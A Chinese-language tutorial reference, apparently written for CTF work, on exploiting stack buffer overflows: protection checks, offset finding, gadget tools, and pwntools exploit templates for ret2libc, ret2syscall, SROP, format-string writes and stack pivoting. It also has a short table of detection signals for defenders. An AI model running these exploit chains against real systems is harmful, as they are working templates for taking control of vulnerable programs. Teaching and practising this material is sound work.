# 栈利用：保护判断、gadget、ret2libc 与 SROP

> 被 `pwn-chain` 引用。栈题的失败率高在**两个细节**：栈对齐（`movaps` 崩）
> 和 libc 版本。技术本身不难，难在"通了本地、崩了远程"。

## 一、保护机制判断（一条命令 + 每个标志的含义）

```bash
checksec --file=./vuln
# 或
pwn checksec ./vuln
# 输出示例：
#   Arch:     amd64-64-little
#   RELRO:    Partial RELRO
#   Stack:    Canary found
#   NX:       NX enabled
#   PIE:      PIE enabled
#   SHSTK:    Enabled            ← CET 影子栈（新工具才有）
#   IBT:      Enabled            ← 间接分支跟踪
```

| 机制 | 怎么自己验（不信 checksec） | 对利用的硬约束 |
| --- | --- | --- |
| **NX** | `readelf -l ./vuln \| grep GNU_STACK` → 有 `RWE` 才是可执行栈 | 有 NX 就不能执行栈上 shellcode |
| **Canary** | `readelf -sW ./vuln \| grep __stack_chk_fail` | 必须 leak 或绕过，否则溢出必 abort |
| **PIE** | `readelf -h ./vuln \| grep Type` → `DYN` + 有 INTERP | 无 PIE 可直接用绝对地址 |
| **Full RELRO** | `readelf -l \| grep GNU_RELRO` + `readelf -d \| grep BIND_NOW` | Full RELRO → GOT 只读，不能 ret2got |
| **FORTIFY** | `readelf -sW \| grep _chk` | 有 `__*_chk` 说明长度被检查，溢出点受限 |
| **CET (SHSTK/IBT)** | `readelf -n \| grep -i "shadow stack\|ibt"` 或 `checksec` 新版 | SHSTK → ROP 会崩（ret 与影子栈不符）；IBT → 只能跳 `endbr64` 处 |

```bash
# 缺 checksec 时的最小手查
readelf -h ./vuln | grep -E "Type|Entry"
readelf -lW ./vuln | grep -E "GNU_STACK|GNU_RELRO"
readelf -dW ./vuln | grep -E "BIND_NOW|FLAGS"
readelf -sW ./vuln | grep -cE "__stack_chk_fail|_chk@"
```

## 二、找偏移（三条路，必须互相验证）

```bash
# 路 1：cyclic 模式（最准）
python3 -c "from pwn import *; print(cyclic(200))" > /tmp/pat
gdb -q ./vuln -ex "run < /tmp/pat" -ex "info registers rip" -ex "bt"
# 崩在 0x6161616c（cyclic 的子串）→ 
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"

# 路 2：直接看反汇编的栈布局
objdump -d -M intel ./vuln | sed -n '/<vuln>:/,/ret/p'
# 关注 sub rsp, N；lea rax,[rbp-0x40]；读写的长度
```

```python
# 路 3：pwntools 自动 corefile 分析
from pwn import *
p = process('./vuln')
p.sendline(cyclic(200))
p.wait()
core = p.corefile
print("RIP offset:", cyclic_find(core.rip))
print("RSP:", hex(core.rsp))
```

**偏移 = 缓冲区起点到返回地址的距离**，不是到 `rbp` 的距离。
`buf` 在 `rbp-0x40` → 偏移 = 0x40 + 8（saved rbp）= 0x48。

## 三、gadget 工具

```bash
# ROPgadget（最常用）
ROPgadget --binary ./vuln --only "pop|ret" | grep -E "pop rdi ; ret"
ROPgadget --binary ./vuln --only "pop|ret" > gadgets.txt
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep "pop rsi"
ROPgadget --binary ./vuln --depth 8            # 更深的多指令 gadget

# ropper（输出更结构化，支持搜索语义）
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "mov [rdi], rsi"
ropper --file ./vuln --chain "execve"          # 自动找链

# one_gadget（libc 里的"一条指令拿 shell"）
one_gadget ./libc.so.6
one_gadget ./libc.so.6 --level 1               # 放宽约束（更多候选）
# 输出会给约束，如 [rsp+0x40] == NULL / rdx == NULL
```

| 必需 gadget | 用途 |
| --- | --- |
| `pop rdi ; ret` | 第 1 参数 |
| `pop rsi ; pop r15 ; ret` | 第 2 参数（r15 是填充） |
| `pop rdx ; ret` / `pop rdx ; pop rbx ; ret` | 第 3 参数 |
| `pop rax ; ret` | syscall 号 / 返回值控制 |
| `syscall ; ret` | 系统调用 |
| `leave ; ret` | 栈迁移（stack pivot） |
| `ret` | **栈对齐修正**（关键！） |
| `pop rsp ; ret` | 栈迁移到任意地址 |

**缺少 `pop rdx` 时的替代**：`mov rdx, rXX ; ... ; ret`（用 ropper 搜 `mov rdx`），
或用 `libc_csu_init` 的通用 gadget（`__libc_csu_init` 的两段式）：

```text
gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget 2: mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
用法：布置 r12=edi, r13=rsi, r14=rdx, r15=函数指针, rbx=0
```

## 四、ret2libc（最主流）

```python
from pwn import *
context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln')
rop = ROP(elf)

# Stage 1: leak puts 真实地址
#   顺序：pop rdi; puts@got; puts@plt; 回到 main
payload  = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi','ret']).address)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])          # 二次利用
p.sendlineafter(b'> ', payload)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']   # ★ pwntools 设置后，libc.sym 全部变绝对地址
log.info(f"libc base = {hex(libc.address)}")

# Stage 2: system("/bin/sh")
ret = rop.find_gadget(['ret']).address    # ★ 栈对齐修正
payload  = b'A' * offset
payload += p64(ret)                       # 对齐（16 字节）
payload += p64(rop.find_gadget(['pop rdi','ret']).address)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.sendlineafter(b'> ', payload)
p.interactive()
```

### 4.1 栈对齐是 100% 会踩的坑

```text
现象：本地能拿 shell，远程（或换了 libc）崩在 movaps xmm0, [rsp+0x...]
真因：x86-64 的 ABI 要求进入函数时 rsp % 16 == 8（call 压入 8 字节后），
      system 内部用 movaps 对齐访问 → rsp 不 16 对齐 → SIGSEGV
修法：在 call system 前多放一个 ret gadget（相当于 rsp += 8）
判定：崩在 libc 的 movaps 指令上，几乎必然是这个问题
```

| 症状 | 判断 | 修法 |
| --- | --- | --- |
| 崩在 `movaps [rsp+0x40], xmm0` | 对齐问题 | 加一个 `ret` |
| 崩在 `do_system` 前 | 同上 | 同上 |
| 加了 ret 反而崩 | 原本就是对的了 | 去掉（用二分：加/不加各试一次） |
| 崩在 `system` 内部的 `execve` | 参数不是 `/bin/sh` 字符串 | 检查 `next(libc.search(b'/bin/sh\0'))` |

### 4.2 没给 libc 时

```bash
# 1) 用 leak 后 12 位反查（libc 页对齐，低 12 位是固定的）
python3 -c "print(hex(0x7f1234567890 & 0xfff))"     # 得 0x890
# 2) 查 libc-database / libc.rip
./find puts 890
# 或 curl "https://libc.rip/api/find" -d '{"symbols":{"puts":"890"}}'
```

```python
# 3) pwntools 的 libcdb（需要联网）
from pwn import *
print(libcdb.search_by_symbol_offsets({'puts': 0x890}))
```

| 陷阱 | 说明 |
| --- | --- |
| 只用 3 个低 hex 位 | 有碰撞，必须再叠加**第二个函数**的偏移确认 |
| 用 `printf` 而不用 `puts` | printf 有多个版本（`__printf` / `_IO_printf`），偏移不稳 |
| 假设 `libc.address` 自动设置 | 只有 `ELF()` 后手动赋值或 `libc.address = ...` 才有绝对地址 |

## 五、ret2syscall（无 libc / 静态链接）

```python
# 静态链接 → 直接 syscall execve("/bin/sh", 0, 0)
# 需要 rax=59, rdi=addr("/bin/sh"), rsi=0, rdx=0
payload  = b'A' * offset
payload += p64(pop_rax_ret) + p64(59)
payload += p64(pop_rdi_ret) + p64(binsh_addr)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(syscall_ret)
```

| 何时选 syscall | 何时选 libc |
| --- | --- |
| 静态链接、无 libc 符号 | 动态链接、有 libc |
| 需要绕过 seccomp（换成 open/read/write） | 无 seccomp，直接 system 最省事 |
| 找不到 `pop rdx`（syscall 也找不到，就都别想） | gadget 齐全 |

**seccomp 场景**：`seccomp-tools dump ./vuln` 看允许的 syscall，
只允许 `open/read/write` 就不能 `execve`，要写 ORW ROP 链。

```bash
seccomp-tools dump ./vuln
# 输出 "ALLOW" 列表；若 execve 不在其中 → 必须 ORW
```

## 六、SROP（sigreturn oriented programming）

```text
前提：
  1. 能设 rax = 15（rt_sigreturn 的 syscall 号）
  2. 有 syscall; ret 或 int 0x80; ret
  3. 能控制栈上 0x100+ 字节（SigreturnFrame 大小）

原理：内核从栈上恢复寄存器现场 → 全部寄存器由我们指定 → 直接 execve
```

```python
from pwn import *
context.arch = 'amd64'
frame = SigreturnFrame()
frame.rax = 59                    # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr          # 恢复后执行到这里

payload  = b'A' * offset
payload += p64(syscall_ret)       # ★ 跳到这里时 rax 必须已是 15
payload += bytes(frame)           # 紧跟其后就是 sigframe（syscall 不弹栈，rsp 正指向这里）
p.send(payload)

# 关键：第一次调用前要保证 rax == 15
#   常见做法：程序里正好有 "read 返回 15 字节" 或 "mov eax, 15; ret" gadget
```

| 失败原因 | 症状 |
| --- | --- |
| rax 不是 15 | 内核不认，直接 SIGSEGV 或执行了别的 syscall |
| frame 大小不足 | 栈数据不全，恢复后寄存器是垃圾 |
| `syscall` gadget 后有多余指令 | frame 起点偏移，恢复的寄存器全是垃圾 |
| 32 位 | 用 `SigreturnFrame` 换 `arch='i386'`（`int 0x80`，frame 是 `sigcontext`） |

## 七、格式化字符串：任意写

```python
# 1) 找偏移（第几个参数是自己的数据）
p.sendline(b'AAAA' + b'.%p' * 20)
# 输出 "... AAAA.0x7f... .0x41414141 ..." → 第 6 个是 0x41414141 → offset=6

# 2) 任意读（leak）
p.sendline(f'%7$s'.encode() + p64(target_addr))   # 打印 target 处的字符串
p.sendline(f'%7$p'.encode() + p64(target_addr))   # 打印该位置的指针值

# 3) 任意写（pwntools fmtstr_payload）
payload = fmtstr_payload(offset, {target_addr: value}, write_size='short')
# write_size: 'byte'(hhn) / 'short'(hn) / 'int'(n)
# 'short' 最常用：写 2 字节，2 次即可
```

| 写法 | 单次写入量 | 何时用 |
| --- | --- | --- |
| `%hhn` | 1 字节 | 需要精确到字节，payload 长 |
| `%hn` | 2 字节 | **默认最佳**（libc 地址 6 字节 = 3 次） |
| `%n` | 4 字节 | payload 短，但值大时输出极长（慢/超时） |

**关键约束**：

```text
□ %n 写的是"已输出字符数"，所以顺序必须按目标值升序（fmtstr_payload 自动排）
□ 目标地址必须 8 字节对齐地放在 payload 里（否则 %hn 会写偏）
□ 64 位地址含 \x00 → 放 payload 末尾（否则截断）
□ 输出太长会触发超时（远端 read 有 timeout）→ 用 %hn 而不是 %n
□ 有 ASLR 时目标地址必须先 leak（栈地址/PIE 基址/GOT）
```

## 八、栈迁移（stack pivot）

```text
场景：溢出长度不足以放完整 ROP 链（只能覆盖到 saved rbp + ret）
手法：leave; ret  →  rsp = rbp; pop rbp; ret
      → 把 rbp 改成"可控内存地址"，栈就迁过去了

前提：知道一块可控内存的地址（bss / 堆 / 栈上另一处）
```

```python
payload  = b'A' * offset_to_rbp
payload += p64(bss_addr + 0x100)    # 新 rbp（指向我们布置的链）
payload += p64(leave_ret)           # → mov rsp,rbp; pop rbp; ret
# bss 上要预先写好 ROP 链（通常靠 read 第二次输入）
```

| 坑 | 说明 |
| --- | --- |
| 新 rbp 指向的地址不可写 | `leave` 后 `ret` 会读该地址，不可写也会崩 |
| bss 上没提前布置链 | 需要两次输入（第一次写链，第二次触发） |
| `leave; ret` 的 pop rbp 吃掉了链头 | 链的第一个 8 字节会被当 rbp 弹掉，链要从 +8 开始 |

## 九、检测视角（防守方）

| 手法 | 信号 |
| --- | --- |
| 栈溢出 | 进程 SIGSEGV + `__stack_chk_fail` 输出（canary 生效时） |
| ROP 链 | 崩溃时 RIP 落在 libc 的 gadget（`pop rdi; ret` 等），栈上出现连续 libc 地址 |
| SROP | 崩溃现场 `rax=15` 且栈上有 0xF8 字节的伪 sigframe |
| 格式化字符串 | 输出里出现大量 `%p` 的回显；`%n` 触发写时崩溃地址异常 |
| ret2dlresolve | 首次调用时 `dl_runtime_resolve` 被传入伪造的 reloc index |

## 十、验伤信号

| 声称 | 证据 |
| --- | --- |
| "偏移正确" | cyclic 崩在 RIP 的值 == `cyclic_find` 的结果，且**连续两次复现** |
| "leak 正确" | `leak - libc.sym['puts']` 结果是 **0x1000 对齐**的地址 |
| "拿到了 shell" | `id` / `whoami` 的**实际输出**，且是目标 uid |
| "远程稳定" | 连续 20 次运行全部成功（本地 1 次不算） |

**反例（看起来成功其实是假）**：

- 本地 `p.interactive()` 出现 `$` 提示符但打 `id` 无回显 → 拿的是**本地 process**，
  不是远程；先 `p.recv(timeout=1)` 确认
- leak 出来的值看着像 libc，但 base 不是页对齐 → 泄漏的是**栈上的残留地址**
- "远程通了"但 20 次里 3 次崩 → 栈对齐或 ASLR 下的概率问题，不算通
- `system("/bin/sh")` 拿到 shell 但 `cat flag` 报 permission denied →
  目标是 setuid/降权环境，需要先提权

## 十一、常见坑

1. **忘了栈对齐 —— 最高频**。`movaps` 崩溃就是它，加一个 `ret`。
   但要注意：**加不加取决于当前 rsp 对齐状态**，不同 libc 可能不同，用二分试。
2. **libc 版本假设**——本地 `ldd` 是 2.31，远程是 2.35，`__free_hook` 直接没了。
   必须用 leak 反查。
3. **`libc.address` 没设就去取 `libc.sym['system']`**——拿到的是**文件内偏移**，
   不是运行时地址，payload 必崩。设完 base 再打印确认一次。
4. **`/bin/sh` 用 `libc.search` 找错**——`b'/bin/sh'` 可能匹配到 `"/bin/sh -c"`，
   用 `next(libc.search(b'/bin/sh\x00'))` 更准。
5. **canary 字节的 `\x00`**——canary 最低位是 0，`sendline`/`strcpy` 会在那里截断。
   用 `send` 不用 `sendline`，且确认输入函数不按字符串处理。
6. **PIE 开启却用绝对地址**——所有 gadget 和 bss 地址都要 `+ elf.address`
   （leak 后 `elf.address = leaked - elf.sym['main']`）。
7. **CET/SHSTK 环境**——新机器上 ROP 直接崩，`checksec` 要看清 SHSTK 是否 Enabled。